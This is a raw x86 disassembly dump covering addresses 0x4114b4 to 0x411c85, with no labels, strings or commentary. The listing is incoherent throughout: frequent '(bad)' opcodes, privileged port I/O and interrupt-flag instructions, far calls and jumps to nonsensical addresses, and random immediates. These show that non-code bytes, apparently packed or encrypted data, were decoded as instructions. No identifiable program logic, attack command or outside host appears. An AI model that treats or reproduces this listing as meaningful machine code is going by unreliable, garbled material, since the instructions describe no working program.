  4114b4:	loopne 0x4114ba
  4114b6:	pop    DWORD PTR [esi+0x5e]
  4114b9:	pop    ds
  4114ba:	fiadd  DWORD PTR [esi]
  4114bc:	adc    esp,edi
  4114be:	adc    al,0xea
  4114c0:	pushf  
  4114c1:	lea    ebx,[eax+ebp*1+0x1e]
  4114c5:	das    
  4114c6:	or     eax,0xbe8f0fc9
  4114cb:	mov    edx,0x3da2703d
  4114d0:	xchg   esp,eax
  4114d1:	nop
  4114d2:	mov    al,ds:0xda25d7a5
  4114d7:	cli    
  4114d8:	mov    cl,0x54
  4114da:	fnsave ds:0xa5538768
  4114e0:	out    0xd1,al
  4114e2:	fwait
  4114e3:	jg     0x411484
  4114e5:	xlat   BYTE PTR ds:[ebx]
  4114e6:	fs imul edi,ebp,0xffffffdb
  4114ea:	and    eax,0xd4a3bb45
  4114ef:	fcom   QWORD PTR [esi]
  4114f1:	jbe    0x4114a9
  4114f3:	inc    eax
  4114f4:	inc    esi
  4114f5:	mov    DWORD PTR [eax],esi
  4114f7:	test   DWORD PTR [ecx],0x5af32d31
  4114fd:	fstp   TBYTE PTR [ebp-0x1e3cc9c7]
  411503:	test   DWORD PTR [esi-0x17],edi
  411506:	leave  
  411507:	push   es
  411508:	xor    bl,cl
  41150a:	mov    al,0x47
  41150c:	cld    
  41150d:	int    0xff
  41150f:	stos   BYTE PTR es:[edi],al
  411510:	imul   edi,DWORD PTR [esi],0xffffffa7
  411513:	and    edx,edi
  411515:	ret    0x53ad
  411518:	jo     0x4114f9
  41151a:	sub    al,BYTE PTR [esi]
  41151c:	outs   dx,BYTE PTR ds:[esi]
  41151d:	(bad)  
  41151e:	dec    ebp
  41151f:	cmc    
  411520:	les    ebp,FWORD PTR [edx-0x64]
  411523:	adc    ch,BYTE PTR [ebx+0x52289fb6]
  411529:	fcomp  st(7)
  41152b:	ss int 0x67
  41152e:	mov    edx,0xd794a92
  411533:	xlat   BYTE PTR ds:[ebx]
  411534:	dec    eax
  411535:	sbb    al,0xcb
  411537:	add    eax,0x220b3380
  41153c:	das    
  41153d:	cwde   
  41153e:	adc    DWORD PTR [eax-0x25bfbb23],edi
  411544:	cdq    
  411545:	sbb    al,0xcc
  411547:	es (bad) 
  411549:	test   eax,0xff21952
  41154e:	or     eax,0x78ef97aa
  411553:	(bad)  
  411554:	aam    0x45
  411556:	iret   
  411557:	call   0xd56f:0xb23de202
  41155e:	xor    al,0xc3
  411560:	test   DWORD PTR [ebx-0x4c],eax
  411563:	std    
  411564:	adc    al,0xe7
  411566:	xchg   edi,eax
  411567:	push   edx
  411568:	and    al,0x42
  41156a:	xor    al,0xe1
  41156c:	jl     0x4115c3
  41156e:	dec    ecx
  41156f:	stos   BYTE PTR es:[edi],al
  411570:	fwait
  411571:	repz aad 0x9d
  411574:	xchg   DWORD PTR [edi+edi*4-0x2ab77ed5],esp
  41157b:	mov    edi,esp
  41157d:	clc    
  41157e:	not    ebx
  411580:	and    BYTE PTR [ecx-0x18cbe8b5],dh
  411586:	jns    0x4115a6
  411588:	and    esp,esi
  41158a:	sti    
  41158b:	(bad)  
  41158d:	sub    dh,BYTE PTR [ebp+0x24]
  411590:	arpl   WORD PTR [edx+0x5ff885d1],di
  411596:	lock xor al,0x40
  411599:	arpl   WORD PTR [ecx],di
  41159b:	int    0xc2
  41159d:	popa   
  41159e:	pop    ds
  41159f:	jb     0x411618
  4115a1:	inc    eax
  4115a2:	stc    
  4115a3:	dec    edi
  4115a4:	and    DWORD PTR ds:0x65e6a264,0x784a0c89
  4115ae:	xchg   DWORD PTR ds:0xa16f6d9b,edi
  4115b4:	cld    
  4115b5:	pop    ebx
  4115b6:	or     eax,0x9f38abb6
  4115bb:	dec    edx
  4115bc:	dec    ebp
  4115bd:	cmp    esp,edi
  4115bf:	sar    DWORD PTR [ebp-0x6f],1
  4115c2:	cmp    ch,BYTE PTR [edx]
  4115c4:	ja     0x411598
  4115c6:	jmp    0xda331d57
  4115cb:	into   
  4115cc:	jle    0x41164b
  4115ce:	repz or eax,0x99ef1e29
  4115d4:	ret    0xca18
  4115d7:	call   FWORD PTR [edx-0x5]
  4115da:	out    dx,al
  4115db:	and    al,0x1
  4115dd:	mov    ds:0x6b75a414,eax
  4115e2:	(bad)  
  4115e3:	mov    esi,0x3a029eca
  4115e8:	jmp    0x4115a9
  4115ea:	jno    0x41162b
  4115ec:	iret   
  4115ed:	and    ecx,esi
  4115ef:	inc    eax
  4115f0:	push   0x8b2df40d
  4115f5:	lahf   
  4115f6:	inc    edi
  4115f7:	jmp    0x4115de
  4115f9:	push   0x3d
  4115fb:	pop    esp
  4115fc:	maxps  xmm0,XMMWORD PTR [edx+0x5e]
  411600:	or     ecx,DWORD PTR [edi]
  411602:	dec    esp
  411603:	scas   eax,DWORD PTR es:[edi]
  411604:	out    0xeb,eax
  411606:	ins    DWORD PTR es:[edi],dx
  411607:	mov    DWORD PTR [ebx+0x18103ba9],ebx
  41160d:	inc    ecx
  41160e:	sti    
  41160f:	add    esi,edi
  411611:	cmp    BYTE PTR [eax+0x72],0xef
  411615:	xchg   BYTE PTR [edx],dl
  411617:	jge    0x411684
  411619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41161a:	int    0x43
  41161c:	add    edx,ebx
  41161e:	ret    0x975a
  411621:	addr16 pop esi
  411623:	mov    dl,BYTE PTR [edi-0x62]
  411626:	(bad)  
  411627:	call   0x178c827e
  41162c:	mov    bh,0x2b
  41162e:	aam    0x9f
  411630:	fxch   st(7)
  411632:	lods   al,BYTE PTR ds:[esi]
  411633:	sbb    DWORD PTR [ebx+0x2a9f009c],edi
  411639:	pop    eax
  41163a:	and    ah,BYTE PTR [esp+edx*4+0x825f3db]
  411641:	push   es
  411642:	xchg   ebp,eax
  411643:	mov    dl,0x6c
  411645:	inc    ebp
  411646:	xlat   BYTE PTR ds:[ebx]
  411647:	fisttp QWORD PTR [edi+0x2d]
  41164a:	out    dx,al
  41164b:	mov    ebp,0x6943908e
  411650:	xor    eax,0x213723e8
  411655:	int    0x4d
  411657:	pop    ss
  411658:	das    
  411659:	out    0x11,eax
  41165b:	std    
  41165c:	cld    
  41165d:	ficomp DWORD PTR [ebx-0x8e70d49]
  411663:	scas   al,BYTE PTR es:[edi]
  411664:	loope  0x411658
  411666:	push   ss
  411667:	imul   eax,DWORD PTR [edx+0x7c],0xc01cff91
  41166e:	dec    edi
  41166f:	sbb    DWORD PTR [edi*8+0x6c1b4625],eax
  411676:	out    0x94,eax
  411678:	inc    edi
  411679:	jns    0x411604
  41167b:	mov    bh,bh
  41167d:	fiadd  DWORD PTR [edi+eax*4]
  411680:	fld    QWORD PTR [ebx]
  411682:	(bad)  
  411683:	out    dx,eax
  411684:	jae    0x4116fa
  411686:	xlat   BYTE PTR ds:[ebx]
  411687:	inc    DWORD PTR [edx]
  411689:	inc    edx
  41168a:	dec    edx
  41168b:	leave  
  41168c:	cld    
  41168d:	push   ecx
  41168e:	and    BYTE PTR [eax],al
  411690:	ds add eax,0xa617382c
  411696:	inc    edx
  411697:	jae    0x4116ea
  411699:	xchg   edx,eax
  41169a:	cmc    
  41169b:	daa    
  41169c:	push   0x4a
  41169e:	jne    0x4116ed
  4116a0:	mov    es,WORD PTR [edx-0xa8933b1]
  4116a6:	cmp    al,dl
  4116a8:	icebp  
  4116a9:	nop
  4116aa:	adc    esi,0x3a39363e
  4116b0:	fldenv [edx]
  4116b2:	add    BYTE PTR ds:[esi+0x14],ch
  4116b6:	js     0x41169a
  4116b8:	mov    ebp,0xa96b80d8
  4116bd:	xor    eax,0xce855e79
  4116c2:	sub    edx,DWORD PTR [edi-0x60]
  4116c5:	sbb    cl,bl
  4116c7:	inc    ebx
  4116c8:	das    
  4116c9:	mov    al,ds:0x7fe6d276
  4116ce:	out    dx,eax
  4116cf:	and    dh,bl
  4116d1:	imul   edx,edx,0xffffffb5
  4116d4:	jbe    0x4116fa
  4116d6:	sbb    ebp,0x62
  4116d9:	jle    0x41172b
  4116db:	and    al,ch
  4116dd:	lds    eax,FWORD PTR [ebx+0x7f]
  4116e0:	add    ah,al
  4116e2:	aad    0x8f
  4116e4:	jecxz  0x411706
  4116e6:	xchg   esp,eax
  4116e7:	call   0xe3c:0xa30dbb6f
  4116ee:	xchg   BYTE PTR [ecx+0x3f],dh
  4116f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116f2:	cmp    al,0x9c
  4116f4:	sbb    DWORD PTR [ebx+0x69],edx
  4116f7:	inc    ebx
  4116f8:	stos   BYTE PTR es:[edi],al
  4116f9:	loope  0x411683
  4116fb:	sbb    eax,0x0
  411700:	add    BYTE PTR [eax],al
  411702:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  411706:	out    dx,eax
  411707:	(bad)  
  411708:	cmp    esi,esi
  41170a:	repnz sahf 
  41170c:	mov    ebx,0x679f7d23
  411711:	aam    0x91
  411713:	sbb    al,BYTE PTR [ecx]
  411715:	add    BYTE PTR [edx],ah
  411717:	pop    es
  411718:	add    BYTE PTR [eax],al
  41171a:	add    DWORD PTR [edi+0x628aa80c],ebp
  411720:	push   esi
  411721:	(bad)  
  411722:	in     al,0x6e
  411724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411725:	dec    ebp
  411726:	call   0x7f94:0x8a951047
  41172d:	ins    BYTE PTR es:[edi],dx
  41172e:	mov    esp,DWORD PTR [eax]
  411730:	idiv   DWORD PTR es:[ecx]
  411733:	push   cs
  411734:	leave  
  411735:	and    eax,0x86e6f15c
  41173a:	lahf   
  41173b:	adc    eax,0xe8a9ce18
  411740:	cs or  esp,ebp
  411743:	adc    esp,DWORD PTR [eax-0x4c]
  411746:	icebp  
  411747:	call   0x23c666f1
  41174c:	jns    0x411727
  41174e:	dec    ecx
  41174f:	popa   
  411750:	dec    ebp
  411751:	lahf   
  411752:	mov    al,ch
  411754:	mov    edi,0x184f9d6f
  411759:	addr16 fwait
  41175b:	mov    esp,0x7cc94f1f
  411760:	out    0x91,al
  411762:	cdq    
  411763:	mov    eax,ds:0x78a9b6f
  411768:	mov    ebx,0x7a7e83c2
  41176d:	mov    cl,0xa7
  41176f:	pushf  
  411770:	push   ecx
  411771:	mov    cl,0xeb
  411773:	or     eax,0xae7c54a9
  411778:	xor    bl,BYTE PTR [ebx]
  41177a:	cmp    al,dl
  41177c:	push   ecx
  41177d:	inc    ecx
  41177e:	xchg   esi,ebp
  411780:	inc    edx
  411781:	or     eax,DWORD PTR [eax]
  411783:	aam    0xc9
  411785:	xchg   ebx,eax
  411786:	cs cli 
  411788:	pop    ss
  411789:	mov    esp,0x690ff99d
  41178e:	out    0xe2,al
  411790:	enter  0x61a5,0xe9
  411794:	xor    eax,0x16d7aed9
  411799:	xor    BYTE PTR [ebp+0x0],0x93
  41179d:	stos   BYTE PTR es:[edi],al
  41179e:	int3   
  41179f:	pop    eax
  4117a0:	mov    DWORD PTR [edi+0x74b79924],esi
  4117a6:	jnp    0x411775
  4117a8:	gs pop eax
  4117aa:	retf   0x2ffb
  4117ad:	pop    esi
  4117ae:	pusha  
  4117af:	or     al,0xee
  4117b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117b2:	ret    
  4117b3:	sbb    al,0x61
  4117b5:	data16 outs dx,BYTE PTR ds:[esi]
  4117b7:	fs adc bl,dl
  4117ba:	stos   DWORD PTR es:[edi],eax
  4117bb:	inc    edx
  4117bc:	adc    edx,ecx
  4117be:	call   0x7fe5fc7c
  4117c3:	dec    ebx
  4117c4:	lea    ebp,[eax-0x1cce129d]
  4117ca:	xor    al,0x1
  4117cc:	sub    DWORD PTR [edi+0x7c],esp
  4117cf:	mov    esp,0xc58f6d7
  4117d4:	dec    BYTE PTR [ebx+0x77]
  4117d7:	push   es
  4117d8:	xchg   BYTE PTR [edi-0x68],al
  4117db:	adc    DWORD PTR [edx+0x75d60803],0xa4019da1
  4117e5:	into   
  4117e6:	outs   dx,DWORD PTR ds:[esi]
  4117e7:	ret    
  4117e8:	(bad)  
  4117e9:	mov    eax,0xde563f97
  4117ee:	pop    esp
  4117ef:	dec    ebx
  4117f0:	dec    edx
  4117f1:	lahf   
  4117f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117f4:	and    BYTE PTR [ecx-0x4177c79f],cl
  4117fa:	repnz int3 
  4117fc:	inc    esp
  4117fd:	push   DWORD PTR [edx+0x791415a9]
  411803:	fwait
  411804:	enter  0xe726,0x8
  411808:	or     DWORD PTR [ebp+0x1641f57c],edx
  41180e:	call   0x35af0138
  411813:	out    dx,al
  411814:	or     DWORD PTR [ebx+eax*8-0x7b],eax
  411818:	and    ecx,edx
  41181a:	xor    BYTE PTR [edx+ebp*8+0x34],dh
  41181e:	or     eax,0xa6c79ddf
  411823:	aam    0x66
  411825:	in     eax,dx
  411826:	dec    edx
  411827:	jmp    0xc9cdb97d
  41182c:	int    0xd3
  41182e:	or     DWORD PTR [edx-0x4775fc69],edx
  411834:	adc    BYTE PTR [ecx],ch
  411836:	inc    ecx
  411837:	int    0x5b
  411839:	add    bh,dl
  41183b:	mov    bl,BYTE PTR [eax+0x24]
  41183e:	pop    esp
  41183f:	add    bh,BYTE PTR [edi+0xc]
  411842:	std    
  411843:	add    ah,BYTE PTR [esi]
  411845:	pushf  
  411846:	push   esp
  411847:	in     al,dx
  411848:	push   ss
  411849:	pop    es
  41184a:	cmp    esi,eax
  41184c:	sub    esp,DWORD PTR [ecx+ebp*1-0x1100b3a4]
  411853:	dec    esp
  411854:	cs mov esi,ds
  411857:	sahf   
  411858:	sbb    eax,0xfbf662d2
  41185d:	mov    ebx,0xab4afaa4
  411862:	ficom  WORD PTR ds:0xe678b954
  411868:	and    eax,0x1967e49b
  41186d:	fstp   TBYTE PTR [edi-0x7b9cd5bb]
  411873:	lahf   
  411874:	pop    ss
  411875:	call   0xc19b:0x4dc9903f
  41187c:	push   eax
  41187d:	dec    esi
  41187e:	push   es
  41187f:	push   ss
  411880:	sbb    DWORD PTR [ebx],ebp
  411882:	inc    esp
  411883:	adc    DWORD PTR [edi],edi
  411885:	jb     0x411832
  411887:	sub    BYTE PTR [ebx-0x41e6c377],0xd3
  41188e:	dec    ecx
  41188f:	mov    DWORD PTR [edx],0xda99cbdf
  411895:	xor    ebx,DWORD PTR [edx]
  411897:	les    ebp,FWORD PTR [edx-0x2459a783]
  41189d:	push   eax
  41189e:	mov    ebx,0xea8f366a
  4118a3:	jmp    0x13a7:0x2756e8c3
  4118aa:	call   0x32fc:0x3dcf76d2
  4118b1:	into   
  4118b2:	pop    ds
  4118b3:	test   al,0xa6
  4118b5:	mov    ds:0xc8ba604c,al
  4118ba:	sub    BYTE PTR [edi+edi*4+0x463b5a95],0x38
  4118c2:	jns    0x411850
  4118c4:	jmp    0xdea6d8f8
  4118c9:	mul    DWORD PTR [edi-0x52611475]
  4118cf:	iret   
  4118d0:	loop   0x4118cc
  4118d2:	leave  
  4118d3:	clc    
  4118d4:	inc    esi
  4118d5:	adc    DWORD PTR [ebp+0x40d05d8b],ebp
  4118db:	jne    0x41186f
  4118dd:	test   al,0x27
  4118df:	ins    DWORD PTR es:[edi],dx
  4118e0:	out    0x77,eax
  4118e2:	pop    eax
  4118e3:	fdiv   DWORD PTR [ecx]
  4118e5:	into   
  4118e6:	lds    eax,FWORD PTR [ecx+edx*4]
  4118e9:	inc    edx
  4118ea:	pop    es
  4118eb:	jno    0x4118bc
  4118ed:	mov    edx,0x72676c9c
  4118f2:	and    bh,BYTE PTR ds:0x4632b31a
  4118f8:	inc    esi
  4118f9:	add    DWORD PTR [esi-0x26],edx
  4118fc:	faddp  st(6),st
  4118fe:	(bad)
  411902:	and    DWORD PTR [ebp+0x31],ebp
  411905:	or     eax,0xe7b680ce
  41190a:	mov    bh,BYTE PTR [esi]
  41190c:	sub    ebx,DWORD PTR ds:0xc4e6566f
  411912:	dec    ebx
  411913:	test   eax,0xf1701410
  411918:	loope  0x41192f
  41191a:	mov    ecx,0xb31e2cbd
  41191f:	outs   dx,BYTE PTR ds:[esi]
  411920:	mov    esp,es
  411922:	cmp    BYTE PTR [edi-0x72a97619],ah
  411928:	lods   eax,DWORD PTR ds:[esi]
  411929:	mov    ecx,ebp
  41192b:	mov    al,ds:0x9bd2c39d
  411930:	sub    BYTE PTR [ebp*4-0x925e40a],bh
  411937:	mov    ebp,0x6fb0461
  41193c:	pop    eax
  41193d:	inc    ecx
  41193e:	push   ebx
  41193f:	mov    cl,BYTE PTR [edx]
  411941:	(bad)  
  411942:	pop    ecx
  411943:	xchg   ebp,eax
  411944:	and    al,0xee
  411946:	push   ebx
  411947:	pop    esp
  411948:	pop    eax
  411949:	cmp    esp,DWORD PTR [ebx-0x57d7d69c]
  41194f:	add    DWORD PTR [edi],ebx
  411951:	aas    
  411952:	(bad)  
  411954:	xchg   ebp,eax
  411955:	retf   0x509e
  411958:	mov    al,ds:0x5f33b718
  41195d:	jbe    0x4119cd
  41195f:	out    0xfc,eax
  411961:	ss js  0x411918
  411964:	and    al,0x33
  411966:	dec    edx
  411967:	sti    
  411968:	jp     0x621017c5
  41196e:	inc    edi
  41196f:	imul   ebx,DWORD PTR [eax+0x6923ea16],0x53
  411976:	ret    
  411977:	sub    DWORD PTR [eax],0xfffffff1
  41197a:	stos   BYTE PTR es:[edi],al
  41197b:	paddsb mm2,mm7
  41197e:	sub    eax,0x26649cb5
  411983:	rcl    BYTE PTR [eax+ecx*1],0x95
  411987:	outs   dx,BYTE PTR ds:[esi]
  411988:	call   0x4feef74c
  41198d:	pushf  
  41198e:	fbld   TBYTE PTR [edi-0x52]
  411991:	pop    esi
  411992:	mov    ecx,0x676bd5e4
  411997:	test   DWORD PTR [eax],esi
  411999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41199a:	gs inc esp
  41199c:	int    0xe4
  41199e:	into   
  41199f:	mov    DWORD PTR [edi+0x46],ecx
  4119a2:	dec    edx
  4119a3:	pop    edi
  4119a4:	mov    dh,0xf0
  4119a6:	not    DWORD PTR [ebx+edi*4-0x22]
  4119aa:	stos   BYTE PTR es:[edi],al
  4119ab:	dec    ebp
  4119ac:	bound  ebp,QWORD PTR [ebx-0x15]
  4119af:	bound  ebx,QWORD PTR [edx+0x1ee5a77d]
  4119b5:	fstp   DWORD PTR [ecx+0x18321cdd]
  4119bb:	mov    BYTE PTR [ebp+0x19],cl
  4119be:	retf   
  4119bf:	scas   eax,DWORD PTR es:[edi]
  4119c0:	dec    esp
  4119c1:	mov    ah,BYTE PTR [edx*4-0xb725b49]
  4119c8:	(bad)  
  4119c9:	xchg   ebp,eax
  4119ca:	shl    DWORD PTR [esi],1
  4119cc:	out    dx,eax
  4119cd:	int3   
  4119ce:	adc    DWORD PTR [ebx+0x29],ecx
  4119d1:	outs   dx,DWORD PTR ds:[esi]
  4119d2:	lea    ecx,[eax+eax*4]
  4119d5:	pop    esi
  4119d6:	(bad)  [ebp+0x3a]
  4119d9:	sub    ecx,edi
  4119db:	mov    ds,WORD PTR [edi-0x6c]
  4119de:	aad    0x3d
  4119e0:	dec    edx
  4119e1:	mov    bl,0xa6
  4119e3:	cmc    
  4119e4:	push   esi
  4119e5:	rcl    BYTE PTR [edx+edi*2+0x260f3e46],0xf3
  4119ed:	pop    edi
  4119ee:	iret   
  4119ef:	or     BYTE PTR [edx],dl
  4119f1:	pop    edx
  4119f2:	jp     0x4119d5
  4119f4:	mov    bl,0xcc
  4119f6:	push   ecx
  4119f7:	push   edi
  4119f8:	popa   
  4119f9:	mov    ebx,0xefb15b8
  4119fe:	mov    edx,DWORD PTR [eax]
  411a00:	pushf  
  411a01:	xchg   ebp,eax
  411a02:	push   esp
  411a03:	mov    bh,0x38
  411a05:	xchg   ebp,eax
  411a06:	jns    0x411a48
  411a08:	jmp    0x411a50
  411a0a:	stos   BYTE PTR es:[edi],al
  411a0b:	shl    bl,0x3d
  411a0e:	out    dx,eax
  411a0f:	dec    edx
  411a10:	in     eax,dx
  411a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a12:	fstp   TBYTE PTR [edi-0x73]
  411a15:	sub    DWORD PTR [edx],ebx
  411a17:	sub    DWORD PTR [edx+0xf],edx
  411a1a:	cld    
  411a1b:	out    dx,eax
  411a1c:	push   es
  411a1d:	mov    ds:0xe8d65045,al
  411a22:	sar    DWORD PTR [ebx-0x2f],cl
  411a25:	sti    
  411a26:	xor    ebx,esp
  411a28:	pop    ecx
  411a29:	call   0x1d74:0xd013e689
  411a30:	add    eax,0x4d63f491
  411a35:	jnp    0x4119d8
  411a37:	xor    al,0x5f
  411a39:	xor    ch,BYTE PTR [ebx-0x40]
  411a3c:	lock fsubr st,st(7)
  411a3f:	and    edx,DWORD PTR [edi]
  411a41:	lods   al,BYTE PTR ds:[esi]
  411a42:	inc    ebp
  411a43:	outs   dx,BYTE PTR ds:[esi]
  411a44:	inc    ebx
  411a45:	xchg   dh,bh
  411a47:	and    ebx,DWORD PTR [eax]
  411a49:	sbb    ah,BYTE PTR [eax]
  411a4b:	outs   dx,DWORD PTR ds:[esi]
  411a4c:	mov    al,ds:0xd3f4392d
  411a51:	test   eax,0x16403b8e
  411a56:	out    dx,eax
  411a57:	jge    0x411a43
  411a59:	fcomi  st,st(1)
  411a5b:	adc    al,0xd5
  411a5d:	jp     0x411a9c
  411a5f:	sar    DWORD PTR [esi+edx*1+0x72],cl
  411a63:	jmp    0x2d2f9c21
  411a68:	xor    edi,DWORD PTR [edi+0x651be42f]
  411a6e:	ret    
  411a6f:	mov    cl,0x59
  411a71:	inc    edx
  411a72:	xor    al,0xc
  411a74:	mov    ds:0x1de72b5a,al
  411a79:	leave  
  411a7a:	push   ecx
  411a7b:	xor    al,0x0
  411a7d:	clc    
  411a7e:	nop
  411a7f:	sub    al,0xbd
  411a81:	lds    ebp,FWORD PTR ds:0xf36dfde7
  411a87:	cli    
  411a88:	sbb    eax,0xd8f16df7
  411a8d:	imul   DWORD PTR [ebx+0x12a85f41]
  411a93:	add    al,0xc8
  411a95:	enter  0xd6be,0x9f
  411a99:	outs   dx,DWORD PTR ds:[esi]
  411a9a:	mov    al,ds:0x5bc50dd4
  411a9f:	add    al,0xa1
  411aa1:	ret    0x79c
  411aa4:	sbb    cl,bh
  411aa6:	cdq    
  411aa7:	jp     0x411ac2
  411aa9:	bound  eax,QWORD PTR [edx]
  411aab:	bnd jne 0x411a7d
  411aae:	add    eax,0xc02fd991
  411ab3:	or     bh,dh
  411ab5:	(bad)  
  411ab6:	cmp    bh,BYTE PTR [edx+0x73]
  411ab9:	in     eax,0x2f
  411abb:	lods   al,BYTE PTR ds:[esi]
  411abc:	clc    
  411abd:	daa    
  411abe:	ror    ebp,cl
  411ac0:	jns    0x411b13
  411ac2:	std    
  411ac3:	xor    ah,BYTE PTR [edi]
  411ac5:	sahf   
  411ac6:	inc    edi
  411ac7:	dec    edx
  411ac8:	sub    DWORD PTR ds:0x63e340e3,esp
  411ace:	cmp    DWORD PTR [eax+0x3c],0xffffff88
  411ad2:	xor    DWORD PTR [ecx+0x63],0xffffffda
  411ad6:	ja     0x411b09
  411ad8:	and    edx,esi
  411ada:	jno    0x411b2a
  411adc:	enter  0xa1f0,0x36
  411ae0:	shl    DWORD PTR [eax],0x55
  411ae3:	icebp  
  411ae4:	and    BYTE PTR ds:0xe59051dd,0x7c
  411aeb:	in     al,0x95
  411aed:	cld    
  411aee:	sbb    esp,DWORD PTR [eax-0x2f]
  411af1:	sbb    cl,bl
  411af3:	push   esp
  411af4:	repz push ebx
  411af6:	jne    0x411afb
  411af8:	lds    esp,FWORD PTR [ebp-0x3b]
  411afb:	fistp  QWORD PTR [eax-0x2c]
  411afe:	mov    ch,0x1f
  411b00:	or     DWORD PTR [ecx+0x4ff0e0ed],ebp
  411b06:	dec    edi
  411b07:	sbb    eax,0xaa70f9e3
  411b0c:	inc    ebp
  411b0d:	or     eax,0x5b0eed6a
  411b12:	loopne 0x411abc
  411b14:	push   ebx
  411b15:	clc    
  411b16:	xchg   esi,eax
  411b17:	cmp    ah,cl
  411b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b1a:	cmc    
  411b1b:	add    BYTE PTR es:0xbcc4118a,bl
  411b22:	in     eax,0x71
  411b24:	mov    dh,0x96
  411b26:	jmp    0x95be:0xf5c1fd5c
  411b2d:	jno    0x411ad6
  411b2f:	and    al,0xad
  411b31:	enter  0x3442,0x7c
  411b35:	push   ebp
  411b36:	xor    bh,al
  411b38:	and    DWORD PTR [edx-0x55],ecx
  411b3b:	fld    TBYTE PTR [eax]
  411b3d:	repnz push ds
  411b3f:	call   0xbd90f63c
  411b44:	mov    eax,0xbf5a4e99
  411b49:	push   ds
  411b4a:	dec    esp
  411b4b:	jmp    0x411baa
  411b4d:	loope  0x411af8
  411b4f:	ret    0x5a04
  411b52:	mov    fs,WORD PTR [edi+0x4c]
  411b55:	or     eax,esi
  411b57:	call   0xa30c:0x145671e2
  411b5e:	call   0xed4ad373
  411b63:	mov    eax,ds
  411b65:	and    DWORD PTR [edi+0x69],eax
  411b68:	pop    edx
  411b69:	and    al,0x74
  411b6b:	(bad)  
  411b6c:	mov    WORD PTR [eax],ds
  411b6e:	aad    0x28
  411b70:	push   eax
  411b71:	cli    
  411b72:	mov    BYTE PTR [edx+ecx*4-0x6de05d8d],cl
  411b79:	stc    
  411b7a:	ins    BYTE PTR es:[edi],dx
  411b7b:	inc    edi
  411b7c:	jne    0x411b67
  411b7e:	aad    0x9a
  411b80:	push   edx
  411b81:	sub    edi,DWORD PTR [eax+0x29]
  411b84:	cmp    BYTE PTR [ebx+0x62e2e2ce],0x4d
  411b8b:	sbb    eax,0xafa9183b
  411b90:	retf   
  411b91:	clc    
  411b92:	sahf   
  411b93:	mov    dl,0xeb
  411b95:	dec    ebx
  411b96:	mov    bh,0xb7
  411b98:	dec    edi
  411b99:	jae    0x411b37
  411b9b:	and    eax,DWORD PTR [esi]
  411b9d:	jno    0x411bfc
  411b9f:	dec    ecx
  411ba0:	or     ah,cl
  411ba2:	addr16 retf 
  411ba4:	icebp  
  411ba5:	add    esi,esi
  411ba7:	jg     0x411b34
  411ba9:	inc    edi
  411baa:	and    DWORD PTR [edi-0x36],ebp
  411bad:	into   
  411bae:	xor    cl,BYTE PTR [ecx+0x6d2d76ce]
  411bb4:	call   0x583e:0x9b1f48d4
  411bbb:	das    
  411bbc:	pop    ecx
  411bbd:	add    ah,BYTE PTR [esi]
  411bbf:	das    
  411bc0:	jp     0x411b8d
  411bc2:	sbb    BYTE PTR [eax+edx*4+0x1f],al
  411bc6:	sbb    BYTE PTR ds:0x973d59f0,al
  411bcc:	and    DWORD PTR [ebp-0x64],eax
  411bcf:	sbb    dh,al
  411bd1:	mov    bl,0x32
  411bd3:	scas   al,BYTE PTR es:[edi]
  411bd4:	push   eax
  411bd5:	aas    
  411bd6:	push   0xffffff8c
  411bd8:	fld    QWORD PTR [ecx+0x49]
  411bdb:	shr    DWORD PTR [edi],cl
  411bdd:	push   ds
  411bde:	xchg   esi,eax
  411bdf:	(bad)  
  411be0:	cmp    bh,0xcd
  411be3:	out    dx,al
  411be4:	test   eax,0x59b1590e
  411be9:	test   BYTE PTR [esi],ah
  411beb:	cld    
  411bec:	sbb    al,0x3b
  411bee:	jae    0x411b8e
  411bf0:	mov    WORD PTR [esi+esi*8-0x51],es
  411bf4:	or     dl,BYTE PTR [edi+0x3d]
  411bf7:	cmp    BYTE PTR [edi+edi*2],bh
  411bfa:	sub    eax,0x3dc52826
  411bff:	inc    edx
  411c00:	sub    DWORD PTR [ebx+0x77],esp
  411c03:	jbe    0x411c15
  411c05:	mov    bh,bh
  411c07:	call   0x8eab:0x92231cf4
  411c0e:	add    eax,0x369f6580
  411c13:	ds dec ebp
  411c15:	xchg   ebx,eax
  411c16:	pushf  
  411c17:	inc    eax
  411c18:	adc    al,0x32
  411c1a:	push   eax
  411c1b:	pop    ecx
  411c1c:	fnstcw WORD PTR [edx]
  411c1e:	xchg   esi,eax
  411c1f:	es loop 0x411bd3
  411c22:	fstp   DWORD PTR [edi+0x2a]
  411c25:	mov    esp,0x564d1a48
  411c2a:	retf   0x68ad
  411c2d:	mov    ss,WORD PTR [esi+0x46]
  411c30:	mov    eax,0xbaeca27c
  411c35:	pusha  
  411c36:	loop   0x411cb7
  411c38:	shl    DWORD PTR [eax+0x2a],0x6
  411c3c:	or     eax,ebx
  411c3e:	nop
  411c3f:	nop
  411c40:	pop    esp
  411c41:	push   cs
  411c42:	aas    
  411c43:	xor    al,0x10
  411c46:	in     eax,0x24
  411c48:	and    bl,bh
  411c4a:	std    
  411c4b:	retf   
  411c4c:	(bad)  
  411c4d:	mov    eax,ds:0xbc77192a
  411c52:	pop    ds
  411c53:	lahf   
  411c54:	jbe    0x411bf1
  411c56:	repz pop eax
  411c58:	ret    
  411c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c5a:	mul    ecx
  411c5c:	dec    edi
  411c5d:	(bad)  
  411c5e:	cmp    DWORD PTR [ebx],esp
  411c60:	scas   eax,DWORD PTR es:[edi]
  411c61:	(bad)  
  411c62:	jmp    0x411c7d
  411c64:	es push esi
  411c66:	sahf   
  411c67:	cmp    eax,0x469f1e87
  411c6c:	push   ebx
  411c6d:	jb     0x411bf9
  411c6f:	jge    0x411c4d
  411c71:	push   es
  411c72:	jae    0x411c9e
  411c74:	stc    
  411c75:	sbb    al,0x20
  411c77:	xchg   ah,bl
  411c79:	aam    0xcd
  411c7b:	or     al,BYTE PTR [esi-0x7e]
  411c7e:	js     0x411c51
  411c80:	push   ss
  411c81:	retf   0x89db
  411c84:	pusha  
  411c85:	inc    esi
